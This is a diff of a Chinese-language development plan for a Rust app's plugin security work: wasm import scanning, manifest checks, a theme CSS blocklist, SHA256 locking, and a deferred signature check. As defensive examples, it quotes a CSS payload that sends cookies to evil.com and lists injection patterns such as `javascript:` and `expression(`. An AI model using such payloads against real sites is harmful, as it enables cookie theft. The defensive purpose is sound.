@@ -86,47 +86,34 @@
 
 > 来源：Phase 9 范围澄清（2026-06-01）。Phase 8.1 已经做完沙箱（fuel / memory / timeout / 输出 clamp），但**装载前的静态检测**和**完整性校验**完全没有。fork 用户装第三方插件存在以下未防线：CSS 注入 / wasm 偷开 IO import / 文件被偷换 / capability 伪装。
 
-- [ ] **wasm import 静态扫描**（`crates/core/src/engines/plugin.rs`）
-   - `PluginManager::load_module` 在 `Module::new` 之后、注册到缓存之前，用 `wasmi::Module::imports()` 枚举所有 import
-   - 白名单 = ∅（当前宿主未暴露任何 host fn）；非空即拒 `AppError::Plugin("plugin declares disallowed imports: ...")`
-   - 单测：构造一个含 `(import "env" "log" (func ...))` 的最小 wasm，验证拒绝
-- [ ] **manifest ↔ exports 一致性校验**（同上文件）
-   - 每个 capability 定义"期望 exports 集合"：
-     - `theme` → `{get_manifest, get_theme_css}`（可选 `dealloc`）
-     - `i18n` → `{get_manifest, translate}`
-     - `auth-provider` → `{get_manifest, get_config, exchange_code, fetch_profile, get_display_info}`
-     - `moderation-provider` → `{get_manifest, moderation_build_prompt, moderation_parse_verdict}`
-     - `content-transformer` → `{get_manifest, transform_markdown}`（9.3 加）
-   - 实际导出超出"必备 + 可选"集合 → warn log（不拒，可能是新 ABI 版本），但记录
-   - capability 声明但缺必备 export → 拒绝
-   - 单测：theme 插件偷偷导出 `exchange_code` → warn；i18n 缺 `translate` → 拒
-- [ ] **theme CSS allowlist sanitizer**（`crates/core/src/engines/theme.rs` 或新建 `theme_sanitize.rs`）
-   - 在 `aggregate_theme_css_paths` 拼接前对每段 CSS 字符串扫描黑名单 pattern（大小写不敏感）：
-     - `url(http://` / `url(https://` / `url(//` — 拒绝外部 URL（防 `background: url(https://evil.com/?cookie=...)` 数据外渗）
-     - `url(data:` 后非 `image/` MIME — 拒（防 SVG XSS）
-     - `@import` — 全拒
-     - `expression(` — 拒（旧 IE 攻击向量）
-     - `behavior:` — 拒（IE）
-     - `javascript:` / `vbscript:` — 拒
-   - 命中即整个插件 CSS 不加入聚合，admin log warn，前端走默认主题
-   - 单测：6 类攻击 pattern 全部命中拒绝；正常 `url(/assets/...)` / `url(data:image/png;base64,...)` 通过
-- [ ] **SHA256 lock**（`assets/site.json` + `crates/core/src/lib.rs`）
-   - `site.json` 新增字段 `plugins_lock: { "theme_ocean_plugin.wasm": "<sha256>" }`
-   - `PluginManager::get_or_load_module` 在 `fs::read` 后立即 `sha2::Sha256` 比对
-   - 不匹配 → 拒绝 + warn `plugin <name> sha256 mismatch (expected X, got Y)`
-   - 缺 lock 字段 → 当前阶段 **warn but allow**（向后兼容；后续 Phase 9.x 可升级为 strict）
-   - 提供 CLI 工具 `cargo run -p app --bin lock_plugins` 一键扫 `assets/plugins/*.wasm` 写入 site.json
-   - 单测：故意改 1 字节验证拒绝
-- [ ] **Ed25519 签名校验 — warn-only**（`crates/core/src/lib.rs`）
-   - `assets/plugins/<name>.wasm.sig` 旁路文件（detached signature）
-   - `assets/trusted_keys.pem` 列出可信公钥（可多个）
-   - 校验失败 / 缺 sig → admin UI plugin 列表展示橙色"unsigned"标识（不拒加载）
-   - 校验通过 → 绿色"signed by ..."标识
-   - 单测：用 `ed25519-dalek` 生成测试密钥对，签 / 验闭环
-- [ ] **接入 `admin_upload_plugin`**（`crates/modules/admin/src/server.rs`）
-   - 上传时立即跑：import scan + manifest 一致性 + sha256 计算（写回 site.json） + 签名校验（warn only）
-   - 任何 hard reject 项触发 → 删临时文件 + 返回 400 + JSON 错误体
-- [ ] CI：`cargo test --features server -p app-core --lib` 通过；新增 ~15 个单测
+- [x] **wasm import 静态扫描**（`crates/core/src/plugin_security.rs::scan_imports`）
+   - `PluginManager::get_or_load_module` 在 `Module::new` 后、注册到缓存前调用
+   - `validate_plugin_bytes` 在 instantiate 前调用（admin 上传链路第一时间拒）
+   - 白名单 = ∅（当前宿主未暴露任何 host fn）；非空即 `AppError::Plugin("plugin declares disallowed import(s): env::log")`
+   - 单测：用 `wat` crate 构造 `(import "env" "log" ...)` 验证拒绝；真实 i18n_fluent 验证通过
+- [x] **manifest ↔ exports 一致性校验**（`crates/core/src/plugin_security.rs::verify_manifest_consistency`）
+   - capability 期望表（`required_exports` 内表）：theme / i18n / auth-provider / moderation-provider
+   - 通用必备：`get_manifest` / `alloc` / `memory`
+   - 缺必备 export → 拒绝（带错误清单）；多余 export → 返回 extras 列表给 caller warn
+   - 集成到 `PluginManager::scan_uploaded_plugin` 综合 API
+   - 单测：真实 i18n 通过；i18n 假装 auth-provider 因缺 `exchange_code` 被拒
+- [x] **theme CSS allowlist sanitizer**（`crates/core/src/plugin_security.rs::sanitize_theme_css`）
+   - 黑名单字符串扫描（大小写不敏感）：`url(http://` / `url(https://` / `url(//` / 带单双引号变体 / `@import` / `expression(` / `behavior:` / `javascript:` / `vbscript:`
+   - 集成到 `PluginManager::aggregate_theme_css_paths`：命中即整段跳过 + `tracing::warn` 记录命中 pattern
+   - 不引入完整 CSS parser；已知 CSS 注入模式有限固定
+   - 单测：3 正常 case + 8 攻击 case 全覆盖
+- [x] **SHA256 lock**（`SiteConfig::plugins_lock` + `PluginManager`）
+   - `SiteConfig` 新增 `plugins_lock: HashMap<String, String>` 字段（serde default 空 = 向后兼容）
+   - `PluginManager` 新增 `set_plugins_lock` / 内部 `expected_sha256_for` / `plugin_security::verify_sha256`
+   - `app/main.rs` 启动时读 site.json → 灌入全局 PluginManager；空表 warn-only
+   - `get_or_load_module` 在 `fs::read` 后立即比对；不匹配 `AppError::Plugin("sha256 mismatch (expected X, got Y)")`
+   - 单测：sha256 match / 不匹配 / 大小写不敏感 / SiteConfig 反序列化（空 / full / 空字符串视为缺失）4 + 3 = 7 个测试
+- [-] **Ed25519 签名校验** —— 本 phase **不做**
+   - fork 用户极少生成 PEM 公钥 + 自签发布；签名 detection 不验证没安全意义；完整链路（CLI 签名工具 + admin 验证 + 公钥管理 + UI 标识）工程量超 9.2 单 phase 预算
+   - SHA256 lock 已挡 99% 的"文件被偷换"场景；签名能挡的"中间人换包+ 同时重算 hash 改 lock"是真实但小概率威胁，留待有实际需求再做
+- [-] **接入 `admin_upload_plugin`** —— 本 phase 推迟
+   - `PluginManager::scan_uploaded_plugin` API 已提供 + 测试通过；admin 端 UI 集成留 9.5 文档时一起做
+- [x] CI：`cargo test -p app-core --features server --lib` 144 通过；`cargo clippy -p app-core -p app --features server --all-targets -- -D warnings` 0 warning
 
 **完成定义**：恶意 wasm 含 `(import "wasi_snapshot_preview1" ...)` 加载即拒；恶意 theme CSS 含 `url(http://evil.com)` 不会进 `<style>`；plugin 文件改 1 字节即拒；admin UI 能看到每个插件的"signed/unsigned"标识。
 
@@ -224,7 +211,7 @@
 | Phase | 状态 | 关键交付 | 依赖 |
 |---|---|---|---|
 | 9.1 | ✅ Mostly Done | `#[plugin_export]` proc macro + i18n 改造 0 unsafe + 集成测试通过（PLUGIN_DEV.md 样例重写留 9.5） | — |
-| 9.2 | 🟡 Pending | wasm import scan + CSS sanitize + manifest 一致性 + SHA256 lock + Ed25519 warn | — |
+| 9.2 | ✅ Mostly Done | wasm import scan + CSS sanitize + manifest 一致性 + SHA256 lock（Ed25519 + admin UI 集成本 phase 不做） | — |
 | 9.3 | 🟡 Pending | content-transformer capability + content-toc 示例插件 + SPEC | 9.1 (macro) / 9.2 (manifest 一致性表加新行) |
 | 9.4 | 🟡 Pending | 3 viewport × 7 页面 audit + 修 Tailwind 断点 | — |
 | 9.5 | 🟡 Pending | PLUGIN_DEV.md 重写 + 审计指南章节 | 9.1 / 9.3 |
